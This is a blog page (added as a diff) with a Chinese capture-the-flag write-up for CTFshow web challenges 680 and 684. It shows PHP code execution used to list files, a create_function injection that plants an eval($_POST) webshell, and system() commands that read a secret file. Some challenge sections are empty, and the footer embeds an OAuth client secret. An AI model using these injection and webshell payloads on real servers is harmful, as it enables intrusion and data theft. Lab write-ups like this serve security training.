@@ -1,0 +1,280 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CTFshow大赛原题Writeup | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CTFshow大赛原题Writeup | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="CTFshow大赛原题Writeup
+Web680
+
+他让我们post一个code去跑，首先尝试传入code=phpinfo();
+
+成功弹出phpinfo界面，但是我们发现disable_function几乎禁用了所有的命令执行的函数。
+..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CTFshow大赛原题Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-12-07
+              </span>
+              <span>
+                2 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="ctfshow大赛原题writeup">CTFshow大赛原题Writeup</h1>
+<h2 id="web680">Web680</h2>
+<figure data-type="image" tabindex="1"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/12/07/14f97b7b14299.png" alt="1638867459075.png" loading="lazy"></figure>
+<p>他让我们post一个code去跑，首先尝试传入<code>code=phpinfo();</code></p>
+<figure data-type="image" tabindex="2"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/12/07/bf8daeb8388ac.png" alt="1638867540846.png" loading="lazy"></figure>
+<p>成功弹出<code>phpinfo</code>界面，但是我们发现<code>disable_function</code>几乎禁用了所有的命令执行的函数。</p>
+<p>尝试<code>code=echo(file_get_content(&quot;secret_you_never_know&quot;));</code>发现也不行，应该是禁用了。这时候可以使用</p>
+<p><code>code=print_r(scandir(dirname('__FILE__')));</code></p>
+<p><code>scandir</code>：列出目录中的文件和目录</p>
+<p><code>dirname</code>：返回路径中的目录部分</p>
+<p><code>__FILE__</code>：PHP魔术常量,反回当前PHP文件的完整路径和文件名</p>
+<p><code>__FILE__</code>返回当前php页面的文件名和路径，<code>dirname</code>只截取其中的目录部分，<code>.</code>代表当前目录</p>
+<p>那么<code>scandir(dirname('__FILE__'))</code>就可以列出当前目录的目录和文件了</p>
+<figure data-type="image" tabindex="3"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/12/07/75f84cd7dfdd5.png" alt="1638870563877.png" loading="lazy"></figure>
+<p>得到了<code>secret_you_never_know</code>，但是还是不知道如何读取这个文件，发现浏览器访问可以下载这个文件</p>
+<figure data-type="image" tabindex="4"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/12/07/9d1aa56abe703.png" alt="1638870627539.png" loading="lazy"></figure>
+<p>所以flag为：</p>
+<pre><code>ctfshow{9c116349-3874-4172-ab42-b2abf25e541e}
+</code></pre>
+<h2 id="web681">Web681</h2>
+<h2 id="web682">Web682</h2>
+<h2 id="web683">Web683</h2>
+<h2 id="web684">Web684</h2>
+<pre><code class="language-php">&lt;?php
+$action = $_GET['action'] ?? '';
+$arg = $_GET['arg'] ?? '';
+
+if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
+    show_source(__FILE__);
+} else {
+    $action('', $arg);
+}
+</code></pre>
+<p><strong>分析正则表达式：</strong></p>
+<p><code>^</code>匹配字符串的首字符</p>
+<p><code>*</code>是一个限定符，用来修饰前一个字符或分组，限定匹配重复的数量为任意数量</p>
+<p><code>/i</code>不区分大小写</p>
+<p><code>/s</code>匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[\f\n\r\t\v]</p>
+<p><code>/D</code>如果使用$限制结尾字符,则不允许结尾有换行;</p>
+<p>这题可以用<code>create_function()</code>创建匿名函数，前面加一个<code>\</code>用来绕过正则表达式，用<code>}</code>闭合这个匿名函数，然后后面就可以接上一句话木马<code>eval($_POST['Le1a'])?&gt;</code></p>
+<figure data-type="image" tabindex="5"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/12/07/cc5c5e61bc963.png" alt="1638880896751.png" loading="lazy"></figure>
+<pre><code>post: Le1a=system('ls /');
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/12/07/b1228c84893f8.png" alt="1638881037369.png" loading="lazy"></figure>
+<pre><code>post: Le1a=system('tac /secret_you_never_know');
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/12/07/c7b1568135a44.png" alt="1638881094730.png" loading="lazy"></figure>
+<p>获得flag：</p>
+<pre><code>ctfshow{87f346a1-a16c-4970-ba08-218c4a11dbae}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#ctfshow%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98writeup">CTFshow大赛原题Writeup</a>
+<ul>
+<li><a href="#web680">Web680</a></li>
+<li><a href="#web681">Web681</a></li>
+<li><a href="#web682">Web682</a></li>
+<li><a href="#web683">Web683</a></li>
+<li><a href="#web684">Web684</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/第四届“安洵杯”网络安全挑战赛Writeup/">
+              <h3 class="post-title">
+                第四届“安洵杯”网络安全挑战赛Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
